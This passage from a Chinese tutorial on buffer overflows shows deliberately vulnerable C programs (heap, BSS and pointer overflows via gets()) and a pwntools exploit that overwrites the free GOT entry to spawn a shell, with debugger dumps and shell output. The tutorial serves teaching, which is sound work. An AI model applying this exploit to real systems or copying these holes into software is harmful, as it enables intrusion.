	<span class="token function">memset</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"1.malloc+gets\n2.free\n3.puts\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d %d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>cmd<span class="token punctuation">,</span><span class="token operator">&amp;</span>idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
		idx <span class="token operator">%=</span> <span class="token number">10</span><span class="token punctuation">;</span>
		<span class="token keyword">if</span><span class="token punctuation">(</span>cmd<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d%*c"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>sz<span class="token punctuation">)</span><span class="token punctuation">;</span>
			ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>sz<span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token function">gets</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>		<span class="token comment">//溢出</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cmd<span class="token operator">==</span><span class="token number">2</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token function">free</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 	<span class="token comment">//不再存在double_free</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>cmd<span class="token operator">==</span><span class="token number">3</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			<span class="token function">puts</span><span class="token punctuation">(</span>ptr<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
		<span class="token keyword">else</span>
		<span class="token punctuation">&#123;</span>
			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>
	<span class="token punctuation">&#125;</span>
 	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="3-2-2-实施缓冲区溢出攻击"><a href="#3-2-2-实施缓冲区溢出攻击" class="headerlink" title="3.2.2 实施缓冲区溢出攻击"></a>3.2.2 实施缓冲区溢出攻击</h4><p>我们先申请两 <code>chunk</code>，分别是 <code>ptr[0]</code> 和 <code>ptr[1]</code>，然后先 <code>free(ptr[1])</code>，再 <code>free(ptr[0])</code>，此时 <code>ptr[0]</code> 在 <code>ptr[1]</code> 的前面，即 <code>ptr[0]–&gt;ptr[1]</code> 。在申请堆之前，我们先在20行(即输入参数)前加入断点，则每次执行到该步会暂停。单步调试如下：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107222308611.png" alt="image-20230107222308611"></p>
<p>(申请第一个 <code>chunk</code>)</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107222414310.png" alt="image-20230107222414310"></p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107222425752.png" alt="image-20230107222425752"></p>
<p>(申请第二个 <code>chunk</code>，字符串值为 <code>qqqqssss</code>)</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107222524479.png" alt="image-20230107222524479"></p>
<p>(释放后内存空间的值的情况)</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107222554970.png" alt="image-20230107222554970"></p>
<p>然后我们再次申请一个 <code>chunk</code>，我们将拿到 <code>ptr[0]</code> ，此时进行精心的溢出操作，可以覆盖到 <code>ptr[1]</code>的 <code>fd</code>，再次申请一次 <code>chunk</code> 将拿到 <code>ptr[1]</code>，最后再申请一次 <code>chunk</code> 就可以拿到特定位置的“<code>chunk</code>”，此时进行写入操作就可以修改成我们需要的内容了。在这里我们先演示发生溢出的情况：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230107223201772.png" alt="image-20230107223201772"></p>
<p>基于以上分析，我们编写以下 <code>Python</code> 代码：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./heap'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'deepin-terminal'</span><span class="token punctuation">,</span> <span class="token string">'-x'</span><span class="token punctuation">,</span> <span class="token string">'sh'</span> <span class="token punctuation">,</span><span class="token string">'-c'</span><span class="token punctuation">]</span>
<span class="token keyword">if</span> args<span class="token punctuation">.</span>G<span class="token punctuation">:</span>
    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    
<span class="token keyword">def</span> <span class="token function">cmd</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>
    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token operator">+</span><span class="token string">'\n'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">malloc</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cmd<span class="token punctuation">(</span><span class="token string">'1 %d\n24 %s'</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">:</span>
    cmd<span class="token punctuation">(</span><span class="token string">'2 %d'</span><span class="token operator">%</span>i<span class="token punctuation">)</span>

malloc<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
malloc<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
malloc<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x21</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x601018</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
malloc<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'sh'</span><span class="token punctuation">)</span>
malloc<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span><span class="token number">0x4007d7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'2 3'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在这里，我们将 <code>free</code> 的 <code>got</code> 表的地址换成了 <code>sh()</code> 函数的地址，然后在 <code>ptr[3]</code> 的位置写入了一个“<code>sh</code>”字符串，当我们调用 <code>free(ptr[3])</code> 时，就变成了调用 <code>system(ptr[3])</code>，即 <code>system(sh)</code>;</p>
<p>这里需要注意的是溢出时字符串的构造，可表述为以下形式：</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;20gx 0x602660
140 0x602660:   0x0000000000000000  0x0000000000000021
141 0x602670:   0x6161616161616161  0x6161616161616161
142 0x602680:   0x6161616161616161  0x0000000000000021 &#x2F;&#x2F;&lt;--这个位置是chunk的size需要保留，与申请的字节有关
143 0x602690:   0x0000000000601018  0x0000000000000000
144 0x6026a0:   0x0000000000000000  0x0000000000020961
145 0x6026b0:   0x0000000000000000  0x0000000000000000
146 0x6026c0:   0x0000000000000000  0x0000000000000000
147 0x6026d0:   0x0000000000000000  0x0000000000000000
148 0x6026e0:   0x0000000000000000  0x0000000000000000
149 0x6026f0:   0x0000000000000000  0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行结果如下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qzs@qzs-ubuntu:~/desktop$ python exp.py
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Starting <span class="token builtin class-name">local</span> process <span class="token string">'./heap'</span><span class="token builtin class-name">:</span> pid <span class="token number">25427</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
$ <span class="token function">ls</span>
core  exp.py  heap  heap.c 
$ <span class="token function">whoami</span>
sir
$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>qzs<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>qzs<span class="token punctuation">)</span> 组<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">(</span>qzs<span class="token punctuation">)</span>,7<span class="token punctuation">(</span>lp<span class="token punctuation">)</span>,27<span class="token punctuation">(</span>sudo<span class="token punctuation">)</span>,100<span class="token punctuation">(</span>users<span class="token punctuation">)</span>,107<span class="token punctuation">(</span>netdev<span class="token punctuation">)</span>,110<span class="token punctuation">(</span>lpadmin<span class="token punctuation">)</span>,116<span class="token punctuation">(</span>scanner<span class="token punctuation">)</span>,122<span class="token punctuation">(</span>sambashare<span class="token punctuation">)</span>,996<span class="token punctuation">(</span>autologin<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到，我们得到了程序的 <code>shell</code>，可执行对应的命令。</p>
<h3 id="3-3-BSS-溢出"><a href="#3-3-BSS-溢出" class="headerlink" title="3.3 BSS 溢出"></a>3.3 <code>BSS</code> 溢出</h3><h4 id="3-3-1-构造具有-BSS-溢出漏洞的程序"><a href="#3-3-1-构造具有-BSS-溢出漏洞的程序" class="headerlink" title="3.3.1 构造具有 BSS 溢出漏洞的程序"></a>3.3.1 构造具有 <code>BSS</code> 溢出漏洞的程序</h4><p>我们演示在 <code>BSS</code> 段(未被初始化的数据)的<strong>静态缓冲区溢出</strong>，编写以下具有 <code>BSS</code> 溢出漏洞的程序。经过调试后发现，<code>buf1</code> 与 <code>buf2</code> 的地址会随机变化，我们加入一个判断条件，使得溢出都是从低地址溢出至高地址，也即 <code>注1</code> 中所描述的内容。具体实现如下：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ERROR</span> <span class="token expression"><span class="token operator">-</span><span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZE</span> <span class="token expression"><span class="token number">16</span></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    u_long diff<span class="token punctuation">;</span>

    <span class="token keyword">int</span> oversize<span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token keyword">char</span> buf1<span class="token punctuation">[</span>BUFSIZE<span class="token punctuation">]</span><span class="token punctuation">,</span> buf2<span class="token punctuation">[</span>BUFSIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Usage: %s &lt;numbytes>\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"[Will overflow static buffer by &lt;numbytes>]\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>ERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>buf1 <span class="token operator">>=</span> buf2<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        diff <span class="token operator">=</span> <span class="token punctuation">(</span>u_long<span class="token punctuation">)</span>buf1 <span class="token operator">-</span> <span class="token punctuation">(</span>u_long<span class="token punctuation">)</span>buf2<span class="token punctuation">;</span>		<span class="token comment">// 注1</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        diff <span class="token operator">=</span> <span class="token punctuation">(</span>u_long<span class="token punctuation">)</span>buf2 <span class="token operator">-</span> <span class="token punctuation">(</span>u_long<span class="token punctuation">)</span>buf1<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"buf1 = %p, buf2 = %p, diff = 0x%x (%d) bytes\n\n"</span><span class="token punctuation">,</span>
           buf1<span class="token punctuation">,</span> buf2<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> diff<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">memset</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> BUFSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">memset</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> <span class="token char">'B'</span><span class="token punctuation">,</span> BUFSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    buf1<span class="token punctuation">[</span>BUFSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">,</span> buf2<span class="token punctuation">[</span>BUFSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"before overflow: buf1 = %s, buf2 = %s\n"</span><span class="token punctuation">,</span> buf1<span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    oversize <span class="token operator">=</span> diff <span class="token operator">+</span> <span class="token function">atoi</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>buf1 <span class="token operator">>=</span> buf2<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> <span class="token char">'B'</span><span class="token punctuation">,</span> oversize<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">memset</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> <span class="token char">'B'</span><span class="token punctuation">,</span> oversize<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    buf1<span class="token punctuation">[</span>BUFSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">,</span> buf2<span class="token punctuation">[</span>BUFSIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token char">'\0'</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"after overflow: buf1 = %s, buf2 = %s\n\n"</span><span class="token punctuation">,</span> buf1<span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行代码，得到以下结果：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108114822665.png" alt="image-20230108114822665"></p>
<p>可以看到，<code>buf2</code> 的前8个字节被覆盖了。</p>
<p>下面我们演示在 <code>BSS</code> 段(未被初始化的数据)中的<strong>静态指针溢出</strong>，编写以下具有<code>BSS</code> 溢出漏洞的程序。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZE</span> <span class="token expression"><span class="token number">16</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ADDRLEN</span> <span class="token expression"><span class="token number">4</span> </span><span class="token comment">/* 指针地址的长度 */</span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    u_long diff<span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFSIZE<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>bufptr<span class="token punctuation">;</span>

    bufptr <span class="token operator">=</span> buf<span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>u_long<span class="token punctuation">)</span><span class="token operator">&amp;</span>bufptr <span class="token operator">>=</span> <span class="token punctuation">(</span>u_long<span class="token punctuation">)</span>buf<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        diff <span class="token operator">=</span> <span class="token punctuation">(</span>u_long<span class="token punctuation">)</span><span class="token operator">&amp;</span>bufptr <span class="token operator">-</span> <span class="token punctuation">(</span>u_long<span class="token punctuation">)</span>buf<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
        diff <span class="token operator">=</span> <span class="token punctuation">(</span>u_long<span class="token punctuation">)</span>buf <span class="token operator">-</span> <span class="token punctuation">(</span>u_long<span class="token punctuation">)</span><span class="token operator">&amp;</span>bufptr<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bufptr (%p) = %p, buf = %p, diff = 0x%x (%d) bytes\n"</span><span class="token punctuation">,</span>
           <span class="token operator">&amp;</span>bufptr<span class="token punctuation">,</span> bufptr<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> diff<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">'A'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>u_int<span class="token punctuation">)</span><span class="token punctuation">(</span>diff <span class="token operator">+</span> ADDRLEN<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将diff+ADDRLEN字节的'A'填充到buf中</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"bufptr (%p) = %p, buf = %p, diff = 0x%x (%d) bytes\n"</span><span class="token punctuation">,</span>
           <span class="token operator">&amp;</span>bufptr<span class="token punctuation">,</span> bufptr<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> diff<span class="token punctuation">,</span> diff<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>运行代码，得到以下结果：</p>
<p><img src="https://qianzeshu.oss-cn-hangzhou.aliyuncs.com/img/image-20230108115041249.png" alt="image-20230108115041249"></p>
<p>我们看到，现在指针 <code>bufptr</code> 现在指向一个不同的地址(<code>0x559841414141</code>)，示意如下：</p>
<pre class="line-numbers language-none"><code class="language-none">			buf       	   bufptr
覆盖前:[xxxxxxxxxxxxxxxx][0x559897dba020]
         低址 ------------------&gt; 高址
覆盖后:[AAAAAAAAAAAAAAAA][0x559841414141]
                  [AAAA]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h4 id="3-3-2-实施缓冲区溢出攻击"><a href="#3-3-2-实施缓冲区溢出攻击" class="headerlink" title="3.3.2 实施缓冲区溢出攻击"></a>3.3.2 实施缓冲区溢出攻击</h4><p>下面的程序是一个典型的有弱点的程序，它将用户的输入储存在一个临时文件中：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ERROR</span> <span class="token expression"><span class="token operator">-</span><span class="token number">1</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">BUFSIZE</span> <span class="token expression"><span class="token number">16</span></span></span>

<span class="token comment">/*
  * 将攻击程序以root身份运行或者改变攻击程序中"vulfile"的值；
  * 否则，即使攻击程序成功，它也不会有权限修改/root/.rhosts。
*/</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    FILE <span class="token operator">*</span>tmpfd<span class="token punctuation">;</span>
    <span class="token keyword">static</span> <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFSIZE<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>tmpfile<span class="token punctuation">;</span>

    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Usage: %s &lt;garbage>\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">exit</span><span class="token punctuation">(</span>ERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    tmpfile <span class="token operator">=</span> <span class="token string">"/tmp/vulprog.tmp"</span><span class="token punctuation">;</span> <span class="token comment">/* 这里暂时不考虑链接问题 :) */</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"before: tmpfile = %s\n"</span><span class="token punctuation">,</span> tmpfile<span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter one line of data to put in %s: "</span><span class="token punctuation">,</span> tmpfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">/* 导致buf溢出 */</span>

    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nafter: tmpfile = %s\n"</span><span class="token punctuation">,</span> tmpfile<span class="token punctuation">)</span><span class="token punctuation">;</span>

    tmpfd <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>tmpfile<span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>tmpfd <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"error opening %s: %s\n"</span><span class="token punctuation">,</span> tmpfile<span class="token punctuation">,</span>
                <span class="token function">strerror</span><span class="token punctuation">(</span>errno<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token function">exit</span><span class="token punctuation">(</span>ERROR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">fputs</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> tmpfd<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">/* 将buf提供的数据存入临时文件 */</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>tmpfd<span class="token punctuation">)</span><span class="token punctuation">;</span>
